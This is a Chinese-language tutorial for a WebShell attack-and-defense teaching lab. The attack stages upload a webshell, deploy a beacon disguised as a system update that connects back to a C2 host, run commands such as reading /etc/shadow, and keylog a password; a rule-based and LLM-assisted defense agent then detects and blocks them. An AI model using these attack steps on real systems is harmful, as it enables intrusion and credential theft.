# WebShell 攻防演示系统 - 超详细实操部署文档

> **适用环境**：Windows 笔记本 + VMware 虚拟机 + CentOS 7  
> **架构说明**：C2 远控服务部署在 Windows 宿主机，靶机服务和防御智能体部署在 CentOS 虚拟机  
> **网络配置**：Windows 宿主机 IP `192.168.163.1`，CentOS 虚拟机 IP `192.168.62.128`  
> **安全声明**：本系统仅供安全教学演示使用，严禁用于任何非授权场景

---

## 目录

- [系统架构总览](#系统架构总览)
- [第一阶段：VMware 虚拟机配置](#第一阶段vmware-虚拟机配置)
- [第二阶段：CentOS 7 环境初始化](#第二阶段centos-7-环境初始化)
- [第三阶段：CentOS 靶机部署](#第三阶段centos-靶机部署)
- [第四阶段：Windows 宿主机 C2 部署](#第四阶段windows-宿主机-c2-部署)
- [第五阶段：攻击实操流程（无防御）](#第五阶段攻击实操流程无防御)
- [第六阶段：防御智能体对抗演示](#第六阶段防御智能体对抗演示)
- [第七阶段：对比演示与总结](#第七阶段对比演示与总结)
- [附录：故障排查](#附录故障排查)

---

## 系统架构总览

```
┌──────────────────────────────────────────────────────────────┐
│                    Windows 宿主机 (192.168.163.1)             │
│                                                              │
│  ┌───────────────┐                ┌───────────────────────┐  │
│  │   攻击者浏览器  │  上传WebShell  │   C2 远控服务           │  │
│  │   (操作面板)    │ ────────────► │   c2_console.py        │  │
│  │               │                │   监听: 0.0.0.0:8888   │  │
│  │               │  ◄───────────  │   (start-c2.bat)       │  │
│  └───────────────┘   WebShell页面  └───────────┬───────────┘  │
└──────────────────────────────────────────────────┼────────────┘
                                                   │ C2 通信 (TCP 8888)
                                    192.168.163.1 ←→ 192.168.62.128
┌──────────────────────────────────────────────────┼────────────┐
│           CentOS 7 虚拟机 (192.168.62.128)        │            │
│                                                   ▼            │
│  ┌─────────────┐  部署Beacon  ┌───────────────┐              │
│  │  靶机 Web    │ ──────────► │   Beacon       │              │
│  │  (Apache+PHP)│              │   (Python)     │              │
│  │  :8080       │              │   键盘记录      │              │
│  └──────┬───────┘              └───────┬───────┘              │
│         │                               │                      │
│         │ 监控                           │ 监控                  │
│         ▼                               ▼                      │
│  ┌─────────────────────────────────────────────┐              │
│  │            防御智能体                        │              │
│  │  文件监控 + 网络监控 + 进程监控               │              │
│  │  (隔离文件/阻断IP/终止进程/告警)              │              │
│  └─────────────────────────────────────────────┘              │
└────────────────────────────────────────────────────────────────┘
```

**部署分工**：
| 组件 | 运行位置 | 说明 |
|------|---------|------|
| C2 远控服务 + 控制台 | Windows 宿主机 | Python 直接运行，监听 8888 端口 |
| 靶机 Web 服务 | CentOS 虚拟机 | Apache+PHP，监听 8080 端口 |
| 防御智能体 | CentOS 虚拟机 | 监控文件/网络/进程，自动处置 |
| WebShell 样本 | CentOS 虚拟机 | 供攻击者上传使用 |

---

## 第一阶段：VMware 虚拟机配置

### 1.1 创建虚拟机

**操作步骤**：

1. 打开 VMware Workstation（或 VMware Player）
2. 点击「创建新的虚拟机」
3. 选择「典型（推荐）」安装模式
4. 选择 CentOS 7 ISO 镜像文件（如 `CentOS-7-x86_64-DVD-2009.iso`）
5. 设置虚拟机名称：`WebShell-攻防靶机`
6. 设置磁盘大小：`20GB`（建议不低于 15GB）

**预期现象**：虚拟机创建向导完成，显示在虚拟机列表中

### 1.2 配置虚拟机硬件

**操作步骤**：

1. 选中虚拟机 → 点击「编辑虚拟机设置」
2. **内存**：设置为 `2GB`（建议不低于 1GB）
3. **处理器**：2 核（建议不低于 1 核）
4. **网络适配器**：选择 **NAT 模式** 或 **桥接模式**

> **重要**：无论选择哪种模式，确保虚拟机与宿主机能互相 ping 通  
> 当前环境已配置好：宿主机 `192.168.163.1` ↔ 虚拟机 `192.168.62.128`

5. 点击「确定」保存设置

**预期现象**：硬件配置完成，状态显示为"就绪"

### 1.3 安装 CentOS 7

**操作步骤**：

1. 点击「开启此虚拟机」
2. 选择 `Install CentOS 7`（按回车）
3. **语言**：选择 `中文` → `简体中文`（或 English）
4. **安装位置**：点击自动分区 → 完成
5. **网络和主机名**：打开以太网开关 → 设置主机名为 `webshell-target`
6. 点击「开始安装」
7. **设置 ROOT 密码**：点击「ROOT 密码」→ 设置密码（自行记住）
8. 等待安装完成（约 10-15 分钟）
9. 点击「重启」

**预期现象**：系统重启后显示登录提示符 `webshell-target login:`

### 1.4 确认网络连通性

**操作步骤**：

1. 使用 root 用户登录 CentOS 虚拟机
2. 查看虚拟机 IP：
```bash
ip addr
```
确认 IP 为 `192.168.62.128`

3. 在 CentOS 中 ping 宿主机：
```bash
ping -c 3 192.168.163.1
```

4. 在 Windows 宿主机 CMD 中 ping 虚拟机：
```cmd
ping 192.168.62.128
```

**预期现象**：双向 ping 通，无丢包

> **如果 ping 不通**：检查 VMware 网络适配器设置，确保虚拟机网络已连接。NAT 模式下宿主机的 VMnet8 虚拟网卡 IP 通常就是 `192.168.163.1`。

---

## 第二阶段：CentOS 7 环境初始化

### 2.1 配置网络（确保可上网）

**操作步骤**：

```bash
# 测试网络连通性
ping -c 3 8.8.8.8

# 如果不通，执行：
dhclient
```

**预期现象**：能 ping 通外网 IP

### 2.2 配置防火墙和 SELinux

**操作步骤**：

```bash
# 开放 Web 服务端口（C2 在宿主机上，靶机不需要开放 8888）
firewall-cmd --permanent --add-port=8080/tcp
firewall-cmd --reload

# 关闭 SELinux（避免影响 Web 服务和防御智能体）
setenforce 0
sed -i 's/^SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config
```

**预期现象**：
- `firewall-cmd` 命令执行无报错
- `getenforce` 输出 `Permissive`

### 2.3 传输项目文件到虚拟机

**方法一：使用 SCP（推荐）**

在 Windows 宿主机的 CMD 或 PowerShell 中执行：

```bash
scp -r "F:\note\WorkBuddy\2026-07-16-09-45-15\webshell-attack-defense-system" root@192.168.62.128:/root/
```

输入密码后等待传输完成。

**方法二：使用 VMware 共享文件夹**

1. 在 VMware 虚拟机设置中 → 选项 → 共享文件夹 → 启用
2. 添加 Windows 上的项目目录为共享文件夹
3. 在 CentOS 7 中挂载：
```bash
vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
cp -r /mnt/hgfs/共享文件夹名/webshell-attack-defense-system /root/
```

**方法三：使用 Xshell / MobaXterm 等工具的 SFTP 功能**

直接拖拽文件到 SFTP 面板。

**预期现象**：在虚拟机中执行 `ls /root/webshell-attack-defense-system/` 能看到所有项目文件

### 2.4 安装基础工具

```bash
yum install -y wget vim net-tools
```

**预期现象**：工具安装完成，无报错

---

## 第三阶段：CentOS 靶机部署

### 3.1 一键部署（在 CentOS 虚拟机中执行）

**操作步骤**：

```bash
cd /root/webshell-attack-defense-system
sudo bash scripts/setup-all.sh
```

**预期现象**：

脚本将依次执行（注意：C2 服务不再部署到 CentOS，而是在 Windows 上运行）：
```
[1/5] 系统初始化...        → 安装 Apache、PHP、Python3
[2/5] 部署靶机 Web 服务... → 配置上传漏洞站点 (端口 8080)
[3/5] 部署防御智能体...    → 安装防御程序
[4/5] 准备 WebShell 样本.. → 复制攻击样本
[5/5] 配置权限和防火墙...  → 开放 8080 端口、设置权限
```

最终显示：
```
╔══════════════════════════════════════════════════════╗
║  靶机部署完成!                                       ║
╠══════════════════════════════════════════════════════╣
║  [靶机 - CentOS VM]                                   ║
║  Web 服务:     http://<本机IP>:8080                  ║
║  防御智能体:   cd defense-agent &&              ║
║                sudo bash start-defense.sh             ║
║  WebShell样本: /opt/webshell/                        ║
║                                                      ║
║  [C2 - Windows 宿主机]                                ║
║  启动C2:      双击 c2-server\start-c2.bat           ║
║  或CMD运行:   cd c2-server && python c2_console.py   ║
║  C2监听:      0.0.0.0:8888                           ║
╚══════════════════════════════════════════════════════╝
```

### 3.2 验证 CentOS 部署结果

**验证靶机 Web 服务**：

在 Windows 宿主机浏览器中访问：
```
http://192.168.62.128:8080
```

**预期现象**：看到文件上传系统页面，标题为"文件上传系统 - 演示靶场"

**验证 Apache 运行**（在 CentOS 中）：
```bash
systemctl status httpd
```
应显示 `active (running)`

**验证防御智能体文件**：
```bash
ls defense-agent/
```
应显示 `defense_agent.py  defense_console.py  start-defense.sh`

**验证 WebShell 样本**：
```bash
ls /opt/webshell/
```
应显示 `beacon.py  webshell.php`

---

## 第四阶段：Windows 宿主机 C2 部署

### 4.1 安装 Python 3

**检查是否已安装**：

在 Windows CMD 中执行：
```cmd
python --version
```

**预期现象**：显示 `Python 3.x.x`

> **如果未安装**：
> 1. 访问 https://www.python.org/downloads/ 下载 Python 3.8+
> 2. 安装时**务必勾选** `Add Python to PATH`
> 3. 安装完成后重新打开 CMD，再次执行 `python --version` 确认

### 4.2 Windows 防火墙放行 8888 端口

**操作步骤**：

以**管理员身份**打开 CMD，执行：

```cmd
netsh advfirewall firewall add rule name="C2-8888" dir=in action=allow protocol=TCP localport=8888
```

**预期现象**：显示 `确定。`

**验证规则已添加**：
```cmd
netsh advfirewall firewall show rule name="C2-8888"
```

> **如果不放行**：CentOS 中的 Beacon 无法连接到 Windows 上的 C2 服务器

### 4.3 启动 C2 控制台

**操作步骤**：

**方式一：双击启动（推荐）**

1. 打开文件资源管理器，导航到项目 C2 目录：
```
F:\note\WorkBuddy\2026-07-16-09-45-15\webshell-attack-defense-system\c2-server\
```
2. 双击 `start-c2.bat`

**方式二：CMD 命令启动**

```cmd
cd F:\note\WorkBuddy\2026-07-16-09-45-15\webshell-attack-defense-system\c2-server
start-c2.bat
```

**方式三：直接用 Python 启动**

```cmd
cd F:\note\WorkBuddy\2026-07-16-09-45-15\webshell-attack-defense-system\c2-server
python c2_console.py
```

**预期现象**：

CMD 窗口显示：
```
==================================================
  C2 远控服务启动 (Windows 宿主机)
==================================================

[*] Python: python
Python 3.x.x
[*] 工作目录: F:\...\c2-server
[*] 监听端口: 8888 (所有网卡)
==================================================
  启动 C2 控制台...
==================================================

╔══════════════════════════════════════════════╗
║          C2 远控操作控制台                   ║
║          WebShell 攻防演示系统               ║
╚══════════════════════════════════════════════╝

命令帮助: list | use <id> | cmd <command> | keylog on/off/view | alerts | exit

  [*] 启动 C2 服务器...
  [+] C2 服务器已就绪

C2>
```

> **保持此窗口打开**，C2 控制台正在等待 Beacon 连接

### 4.4 验证 C2 端口监听

**操作步骤**：

在 Windows CMD 中新开一个窗口，执行：
```cmd
netstat -an | findstr 8888
```

**预期现象**：
```
TCP    0.0.0.0:8888     0.0.0.0:0     LISTENING
```

> 这表示 C2 服务器正在监听所有网卡的 8888 端口，CentOS 中的 Beacon 可以连接过来

### 4.5 从 CentOS 验证到 C2 的连通性

**操作步骤**：

在 CentOS 虚拟机中执行：
```bash
# 测试到 C2 服务器的端口连通性
python3 -c "import socket; s=socket.socket(); s.settimeout(3); s.connect(('192.168.163.1', 8888)); print('[+] C2 可达'); s.close()"
```

**预期现象**：输出 `[+] C2 可达`

> **如果不通**：检查 Windows 防火墙规则、VMware 网络配置

---

## 第五阶段：攻击实操流程（无防御）

> **本阶段模拟：防御智能体关闭状态下，攻击者完整入侵链路**  
> **前提**：C2 控制台已在 Windows 上启动（第四阶段）

### 5.1 确认环境就绪

**检查清单**：
- [x] CentOS 靶机 Web 服务运行中（`http://192.168.62.128:8080` 可访问）
- [x] Windows C2 控制台运行中（显示 `C2>` 提示符）
- [x] 防御智能体未启动或处于 OFF 状态
- [x] CentOS 能 ping 通 `192.168.163.1`

### 5.2 上传 WebShell 后门

**操作步骤**：

1. 在 Windows 宿主机浏览器中访问 `http://192.168.62.128:8080`
2. 点击上传区域或拖拽文件
3. 选择 WebShell 文件

   > **获取文件**：  
   > - Windows 本地路径：`F:\note\WorkBuddy\2026-07-16-09-45-15\webshell-attack-defense-system\webshell\webshell.php`  
   > - 或从 CentOS 中 `/opt/webshell/webshell.php` 下载

4. 点击「上传文件」按钮

**预期现象**：

页面显示绿色提示：`上传成功: uploads/webshell.php`

文件列表中出现 `webshell.php`，可点击「访问」链接

### 5.3 访问 WebShell 后门

**操作步骤**：

在浏览器中访问：
```
http://192.168.62.128:8080/uploads/webshell.php
```

**预期现象**：

显示 WebShell 控制面板，包含：
- **系统信息**：显示主机名、用户（apache）、系统版本、IP 地址
- **命令执行**：命令输入框 + 执行按钮 + 输出区域
- **C2 Beacon 部署**：C2 地址（默认 `192.168.163.1`）、端口（默认 `8888`）+ 部署按钮

### 5.4 执行系统命令（Web 交互）

**操作步骤**：

在 WebShell 命令执行区域输入以下命令，逐个执行：

| 命令 | 预期输出 |
|------|---------|
| `id` | `uid=48(apache) gid=48(apache) groups=48(apache)` |
| `whoami` | `apache` |
| `cat /etc/redhat-release` | `CentOS Linux release 7.x.x` |
| `ifconfig` | 显示网卡 IP 信息（192.168.62.128） |
| `ping -c 1 192.168.163.1` | 能 ping 通宿主机 C2 |

**预期现象**：每条命令执行后在输出区域显示结果，证明已获得靶机命令执行权限

### 5.5 部署 C2 Beacon（建立持久通信）

**操作步骤**：

1. 在 WebShell 页面的「C2 Beacon 部署」区域：
   - C2 地址：`192.168.163.1`（默认已填好，指向 Windows 宿主机）
   - C2 端口：`8888`（默认）
2. 点击「部署 Beacon (上线)」按钮

**预期现象**：

WebShell 页面输出区域显示：
```
[+] Beacon 部署成功!
    文件路径: /tmp/.system_update.py
    进程 PID: 12345

    Beacon 已在后台运行，正在连接 192.168.163.1:8888
```

**同时**，在 Windows 的 C2 控制台窗口中出现：
```
[+] Shell#1 上线: apache@webshell-target (192.168.62.128:xxxxx)
```

> **关键观察**：Beacon 从 CentOS 虚拟机（192.168.62.128）主动外联到 Windows 宿主机（192.168.163.1:8888），这是一次真实的跨网络反向连接

### 5.6 通过 C2 远程控制靶机

**操作步骤**：

回到 Windows 上的 C2 控制台窗口，依次输入：

```
C2> list
```

**预期现象**：
```
  ┌────────┬──────────────────┬──────────┬─────────────────┬──────────┐
  │ ID     │ 主机名           │ 用户     │ 上线时间        │ 键盘记录 │
  ├────────┼──────────────────┼──────────┼─────────────────┼──────────┤
  │ #1     │ webshell-target  │ apache   │ HH:MM:SS        │ OFF      │
  └────────┴──────────────────┴──────────┴─────────────────┴──────────┘
```

选择 Beacon：
```
C2> use 1
```
**预期现象**：`[+] 已选择 Shell#1 - apache@webshell-target (192.168.62.128:xxxxx)`

远程执行命令：
```
C2(Shell#1)> cmd id
```
**预期现象**：
```
  [*] 向 Shell#1 下发命令: id
  [+] 执行结果:
  --------------------------------------------------
  uid=48(apache) gid=48(apache) groups=48(apache)
  --------------------------------------------------
```

尝试更多命令：
```
C2(Shell#1)> cmd ls -la /tmp
C2(Shell#1)> cmd cat /etc/shadow
C2(Shell#1)> cmd uname -a
C2(Shell#1)> cmd curl http://192.168.163.1:8888
```

### 5.7 启动键盘记录

**操作步骤**：

在 C2 控制台输入：
```
C2(Shell#1)> keylog on
```

**预期现象**：
```
  [*] 已向 Shell#1 发送键盘记录启动指令
  [+] Shell#1 键盘记录已启动
```

### 5.8 在靶机上输入内容（模拟用户操作）

**操作步骤**：

1. 打开 VMware 虚拟机控制台窗口（或另开一个 SSH 终端连接到 CentOS）
2. 在终端中输入一些内容，模拟真实用户操作，例如：

```bash
# 登录系统后输入
mysql -u root -p
# 输入密码: MySecretPass123
# 输入一些 SQL 命令
show databases;
exit
```

或者直接在 VMware 控制台窗口中敲键盘输入任意内容

> **注意**：键盘记录器读取 `/dev/input/event*`，捕获的是物理键盘输入  
> 通过 VMware 控制台窗口输入 = 物理键盘输入到虚拟机

### 5.9 查看键盘记录数据

**操作步骤**：

回到 Windows 上的 C2 控制台，输入：
```
C2(Shell#1)> keylog view
```

**预期现象**：
```
  [+] Shell#1 键盘记录数据:
  --------------------------------------------------
  mysql -u root -p[ENT]MySecretPass123[ENT]show databases;[ENT]exit[ENT]
  --------------------------------------------------
  总计 87 个字符
```

> **关键观察**：键盘数据从 CentOS 传回了 Windows 宿主机的 C2 服务器，攻击者可以远程窃取靶机上的敏感输入

查看所有键盘记录：
```
C2(Shell#1)> keylog all
```

### 5.10 关闭键盘记录

```
C2(Shell#1)> keylog off
```

**预期现象**：`[*] Shell#1 键盘记录已停止`

### 5.11 无防御攻击小结

至此，完整攻击链路演示完成：

```
文件上传漏洞 → WebShell 部署 → C2 持久通信(跨网络) → 远程命令执行 → 键盘记录窃密
```

**关键观察**：
- Beacon 从 `192.168.62.128`（CentOS）外联到 `192.168.163.1:8888`（Windows C2）
- 整个攻击过程中，**无任何防御机制阻止**攻击行为
- 攻击者在 Windows 上操作 C2 控制台，控制 CentOS 靶机，攻击链路清晰可见

---

## 第六阶段：防御智能体对抗演示

> **本阶段模拟：开启防御智能体后，重复攻击流程，观察防御效果**

### 6.1 重置环境

**操作步骤**：

先在 Windows C2 控制台中输入 `exit` 退出，然后在 CentOS 中执行：

```bash
cd /root/webshell-attack-defense-system
sudo bash scripts/reset-env.sh
```

**预期现象**：
```
[1/5] 清除上传目录...
    [+] 上传目录已清空
[2/5] 终止残留 Beacon 进程...
    [+] 已终止进程: xxxx
[3/5] 清除残留文件...
    [+] 残留文件已清除
[4/5] 重置 iptables 规则...
    [+] iptables OUTPUT 链已重置
[5/5] 重启 Apache...
    [+] Apache 已重启

环境已重置! 可以重新开始攻防演练。
```

### 6.2 启动防御智能体（CentOS 端）

**操作步骤**：

通过 SSH 或 VMware 控制台连接到 CentOS，执行：

```bash
cd defense-agent
sudo bash start-defense.sh
```

**预期现象**：
```
╔══════════════════════════════════════════════╗
║          防御智能体控制台                    ║
║          WebShell 攻防演示系统               ║
╚══════════════════════════════════════════════╝

  [*] 启动防御智能体...
  [*] 文件监控启动 监控目录: /var/www/vulnerable/uploads/
  [*] 网络监控启动 监控 C2 端口: 8888 | C2 IP: 192.168.163.1
  [*] 进程监控启动 监控恶意进程特征
  [*] 防御智能体已启动 (防护默认关闭)

Defense(OFF)>
```

> **注意**：此时防护模式为 **OFF**（关闭），需要手动开启

### 6.3 开启防护模式

**操作步骤**：

在防御控制台输入：
```
Defense(OFF)> on
```

**预期现象**：
```
[+] 防御智能体已激活 - 防护模式: ON
```

提示符变为 `Defense(ON)>`

### 6.4 重新启动 C2 服务（Windows 端）

**操作步骤**：

在 Windows 上重新启动 C2 控制台：
```cmd
cd F:\note\WorkBuddy\2026-07-16-09-45-15\webshell-attack-defense-system\c2-server
start-c2.bat
```

**预期现象**：C2 控制台正常启动，等待 Beacon 连接

### 6.5 尝试上传 WebShell（防御已开启）

**操作步骤**：

1. 在 Windows 浏览器中访问 `http://192.168.62.128:8080`
2. 上传 `webshell.php` 文件
3. 观察页面显示

**预期现象**：

上传页面显示成功（上传接口本身有漏洞），但...

立即查看 **CentOS 防御智能体窗口**：
```
[!!!] 2026-07-16 HH:MM:SS [FILE] 检测到 WebShell 上传: webshell.php
      详情: 命中规则: system() 命令执行, shell_exec() 命令执行, base64_decode()...
[*] 文件已隔离 webshell.php -> /tmp/quarantine/webshell.php.xxx
```

**关键效果**：WebShell 被自动隔离！

尝试访问 `http://192.168.62.128:8080/uploads/webshell.php`：

**预期现象**：返回 404 Not Found（文件已被隔离删除）

### 6.6 尝试直接部署 Beacon（先关闭防御上传，再开防御）

如果需要演示 Beacon 部署被拦截的效果：

1. 在防御控制台输入 `off` 关闭防护
2. 上传 WebShell 并访问，部署 Beacon（C2 地址填 `192.168.163.1`）
3. 等待 Beacon 上线后在 C2 控制台输入 `exit` 退出 Beacon
4. 在防御控制台输入 `on` 重新开启防护
5. 再次在 WebShell 页面部署 Beacon

**预期现象（防御智能体窗口）**：
```
[!!!] 2026-07-16 HH:MM:SS [PROCESS] 检测到 Beacon 进程运行
      详情: PID=12345 CMD=python3 /tmp/.system_update.py
[*] 进程已终止 PID=12345 原因=Beacon 后门
```

Beacon 进程被立即终止，Windows C2 控制台显示 Shell 离线：
```
[-] Shell#1 离线
```

### 6.7 尝试建立 C2 通信（网络层拦截）

即使 Beacon 侥幸启动，防御智能体的网络监控会检测到跨网络 C2 外联：

**预期现象（防御智能体窗口）**：
```
[!!!] 2026-07-16 HH:MM:SS [NETWORK] 检测到 C2 外联通信 [C2端口]
      详情: 连接: 192.168.62.128:xxxxx -> 192.168.163.1:8888 | 进程: python3
[*] 已阻断外联 IP 192.168.163.1
```

> **关键效果**：防御智能体检测到靶机向 Windows 宿主机 `192.168.163.1:8888` 发起 C2 外联，自动通过 iptables 阻断

iptables 自动添加 DROP 规则，Beacon 无法连接 C2。

### 6.8 尝试键盘记录

即使 Beacon 连上了 C2 并启动键盘记录：

**预期现象（防御智能体窗口）**：
```
[!!!] 2026-07-16 HH:MM:SS [PROCESS] 检测到恶意进程: 读取键盘设备的进程
      详情: PID=12346 USER=apache CMD=python3 /tmp/.system_update.py
[*] 进程已终止 PID=12346 原因=读取键盘设备的进程
```

键盘记录进程被检测并终止。

### 6.9 查看防御战果

**操作步骤**：

在防御控制台输入：
```
Defense(ON)> status
```

**预期现象**：
```
==================================================
防御智能体状态:
--------------------------------------------------
运行状态:     运行中
防护模式:     ON (防护激活)
拦截威胁数:   3
告警总数:     7
处置动作数:   5
==================================================
```

查看详细告警：
```
Defense(ON)> alerts
```

**预期现象**：列出所有检测到的威胁告警，包含时间、级别、类别、详情

查看处置记录：
```
Defense(ON)> actions
```

**预期现象**：列出所有自动执行的处置动作（隔离文件、终止进程、阻断 IP）

### 6.10 关闭防护对比

**操作步骤**：

在防御控制台输入：
```
Defense(ON)> off
```

**预期现象**：
```
[!] 防御智能体已关闭 - 防护模式: OFF
```

此时重复 5.2-5.9 的攻击步骤，攻击将**再次成功**（因为防御已关闭）。

再次开启防护：
```
Defense(OFF)> on
```

攻击将被**再次阻断**。

---

## 第七阶段：对比演示与总结

### 7.1 防御 ON vs OFF 对比表

| 攻击行为 | 防御 OFF | 防御 ON |
|---------|---------|---------|
| 上传 WebShell | 上传成功 | 文件被自动隔离 |
| 访问 WebShell | 可执行命令 | 文件不存在 (404) |
| 部署 Beacon | 后台运行 | 进程被立即终止 |
| C2 通信 (跨网络) | 持久连接 192.168.163.1:8888 | 网络被 iptables 阻断 |
| 远程命令执行 | 任意执行 | Beacon 无法连接 |
| 键盘记录 | 持续窃取 | 进程被检测终止 |

### 7.2 防御智能体能力总结

| 监控维度 | 检测方法 | 处置动作 |
|---------|---------|---------|
| 文件监控 | 扫描上传目录 + 特征匹配 | 自动隔离文件 |
| 网络监控 | ss 检测 C2 端口/IP 外联 | iptables 阻断 IP |
| 进程监控 | ps + 特征匹配 | kill -9 终止进程 |
| 键盘记录 | 检测 /dev/input 访问 | 终止进程 + 删除文件 |

### 7.3 架构优势总结

| 优势 | 说明 |
|------|------|
| 攻防分离 | C2 在 Windows，靶机在 CentOS，视觉清晰 |
| 网络真实 | Beacon 跨网络外联，防御网络监控有实际意义 |
| 操作便捷 | C2 控制台在 Windows 主屏操作，无需 SSH |
| 资源节省 | 无需第二个虚拟机，Windows 直接运行 Python |

### 7.4 实操要点回顾

1. **防御智能体可一键启停**：`on` / `off` 命令即时切换
2. **监控全覆盖**：文件 + 网络 + 进程三维度
3. **自动闭环处置**：检测 → 告警 → 隔离/阻断/终止
4. **跨网络检测**：网络监控可检测到靶机向宿主机 C2 的外联
5. **效果直观对比**：同一攻击流程，开防御 vs 关防御效果天壤之别

---

## 附录：故障排查

### A.1 浏览器无法访问 8080 端口

```bash
# 检查 Apache 状态（CentOS 中）
systemctl status httpd

# 检查端口监听
ss -tlnp | grep 8080

# 检查防火墙
firewall-cmd --list-ports

# 如果防火墙未开放
firewall-cmd --permanent --add-port=8080/tcp
firewall-cmd --reload

# 检查 SELinux
getenforce  # 应为 Permissive 或 Disabled
```

### A.2 C2 控制台启动失败（Windows）

```cmd
# 检查 Python 是否安装
python --version

# 如果提示 "python 不是内部命令"
# 重新安装 Python，勾选 "Add Python to PATH"
# 或手动添加 Python 到系统 PATH

# 检查 8888 端口是否被占用
netstat -ano | findstr 8888

# 如果端口被占用，找到进程并结束
taskkill /PID <进程ID> /F
```

### A.3 Beacon 无法连接 C2

```bash
# 在 CentOS 中测试到 C2 的连通性
ping -c 3 192.168.163.1

# 测试 8888 端口连通性
python3 -c "import socket; s=socket.socket(); s.settimeout(3); s.connect(('192.168.163.1', 8888)); print('[+] C2 可达'); s.close()"

# 如果不通，检查：
# 1. Windows 防火墙是否放行 8888（见第四阶段 4.2）
# 2. C2 控制台是否正在运行
# 3. VMware 网络是否正常（双向 ping 测试）
```

```cmd
:: 在 Windows 中检查防火墙规则
netsh advfirewall firewall show rule name="C2-8888"

:: 如果规则不存在，重新添加（管理员 CMD）
netsh advfirewall firewall add rule name="C2-8888" dir=in action=allow protocol=TCP localport=8888
```

### A.4 C2 控制台无 Beacon 上线

```bash
# 检查 Beacon 进程是否在运行（CentOS 中）
ps aux | grep beacon
ps aux | grep system_update

# 检查 Beacon 文件是否存在
ls -la /tmp/.system_update.py

# 手动运行 Beacon 测试
python3 /opt/webshell/beacon.py 192.168.163.1 8888
```

### A.5 键盘记录无数据

```bash
# 检查 apache 用户是否有 input 设备读取权限
groups apache

# 如果没有 input 组，添加：
usermod -aG input apache
systemctl restart httpd

# 检查键盘设备
ls -la /dev/input/event*

# 手动测试 Beacon 键盘记录
python3 /opt/webshell/beacon.py 192.168.163.1 8888
# 然后在另一个终端输入内容
```

### A.6 防御智能体权限不足

```bash
# 防御智能体必须以 root 运行
sudo bash defense-agent/start-defense.sh

# 检查 iptables 命令是否可用
which iptables

# 如果 iptables 未安装
yum install -y iptables iptables-services
```

### A.7 WebShell 页面显示空白

```bash
# 检查 PHP 是否正确安装
php -v

# 检查 PHP 模块是否加载
httpd -M | grep php

# 如果没有 php 模块
yum install -y php
systemctl restart httpd

# 检查上传目录权限
ls -la /var/www/vulnerable/uploads/
chmod 777 /var/www/vulnerable/uploads/
```

### A.8 重置环境后重新演练

```bash
# 每次重新演练前执行（CentOS 中）
sudo bash /root/webshell-attack-defense-system/scripts/reset-env.sh

# Windows 上需要手动重启 C2 控制台
# （退出旧的控制台，重新运行 start-c2.bat）
```

### A.9 iptables 阻断后无法恢复

```bash
# 如果防御智能体阻断了 C2 IP，重置 iptables
iptables -F OUTPUT

# 或执行重置脚本
sudo bash /root/webshell-attack-defense-system/scripts/reset-env.sh
```

---

## 附录：系统组件一览

| 组件 | 运行位置 | 路径 | 说明 |
|------|---------|------|------|
| 靶机 Web 服务 | CentOS VM | `/var/www/vulnerable/` | 文件上传漏洞站点 |
| WebShell 样本 | CentOS VM | `/opt/webshell/` | PHP WebShell + Python Beacon |
| C2 远控服务 | **Windows 宿主机** | `c2-server\` | C2 服务器 + 操作控制台 |
| 防御智能体 | CentOS VM | `defense-agent/` | 文件/网络/进程监控 |
| 部署脚本 | CentOS VM | `/root/webshell-attack-defense-system/scripts/` | 靶机部署 + 环境重置 |
| 隔离目录 | CentOS VM | `/tmp/quarantine/` | 被隔离的可疑文件 |
| Apache 日志 | CentOS VM | `/var/log/httpd/` | Web 服务日志 |

---

## 进阶：多智能体协作防御 + LLM 大脑

原防御智能体是**写死的静态规则引擎**（命中≥2 即杀、一刀切 kill/DROP），确定性、无推理。
升级后改为**多智能体协作架构**，真正的"智能"来自 LLM 研判大脑。

### 架构（7 个角色智能体 + 事件总线）

```
感知层  FileSensor / NetworkSensor / ProcessSensor   ── 只看不动，发 raw.* 事件
   │
   ▼
事件总线 (Event Bus)  ── topic 发布/订阅，线程安全
   │
   ▼
关联层  CorrelatorAgent   ── 滑动窗口把多源信号聚类成 incident（确定性快路径）
   │
   ▼
研判层  TriageAgent       ── LLM 大脑推理(ReAct)，失败自动降级为规则评分
   │                       （这是"智能体"的智能来源）
   ▼
响应层  ResponderAgent    ── 分级响应(告警→隔离→阻断→终止) + 可撤销
   │
   ▼
取证层  ForensicsAgent    ── 证据链报告 + 误报学习回流
```

**为什么不全交给 LLM**：每秒几十个事件直接喂 LLM 会慢/贵。关联层(规则)先过滤 99%，只把"可疑事件"喂 LLM 研判——这是真实安全 Copilot 的工程范式。

### LLM 大脑部署（Windows 宿主机，镜像 C2 拓扑）

LLM 大脑和 C2 一样跑在 Windows 宿主机，CentOS 研判 Agent 跨网调用 `http://192.168.163.1:11434`。

1. 在 Windows 安装 Ollama：https://ollama.com
2. 双击 `llm-brain\start-llm-brain.bat`（自动拉取 `qwen2.5:7b`、设 `OLLAMA_HOST=0.0.0.0`、放行 11434 防火墙、启动服务）
3. 保持窗口开启

> 切换云 API：在 CentOS 设环境变量后启动防御：
> ```bash
> export DEFENSE_LLM_BACKEND=cloud
> export CLOUD_API_URL=https://api.deepseek.com
> export CLOUD_API_KEY=sk-xxx
> export CLOUD_MODEL=deepseek-chat
> ```
> 无 LLM 时设 `DEFENSE_LLM_BACKEND=disabled`，研判 Agent 自动降级为规则评分，演示不中断。

### 启动多智能体防御

```bash
# CentOS 上（需 root）
cd defense-agent
sudo bash start-defense.sh
```

控制台命令：
| 命令 | 作用 |
|------|------|
| `on` / `off` | 开关防护（对比有无防御） |
| `status` | 查看状态（含 LLM 是否可用） |
| `incidents` | 列出所有关联事件 |
| `report [id]` | 查看取证报告（含 LLM 研判依据） |
| `undo` | 撤销最近一组处置（演示"可撤销"） |
| `fp <id>` | 标记事件为误报（写入学习，未来降分） |

### 演示亮点

- **可解释**：`report` 显示 LLM 给出的"为什么判它攻击 + kill-chain 阶段 + 置信度"
- **分级响应**：低置信度仅告警，高置信度才隔离/阻断/终止，不再是"一上传就秒杀"
- **可撤销**：`undo` 恢复被隔离文件、移除 iptables 阻断
- **自适应**：`fp` 标记误报后，相似特征未来自动降分（轻量学习）
- **降级容错**：LLM 大脑未启动也能跑（规则评分），启动后自动切换为 LLM 研判

> 旧版单体防御保留为 `defense_agent_legacy.py` / `defense_console_legacy.py`，可对照"静态规则引擎 vs 多智能体"的差异。

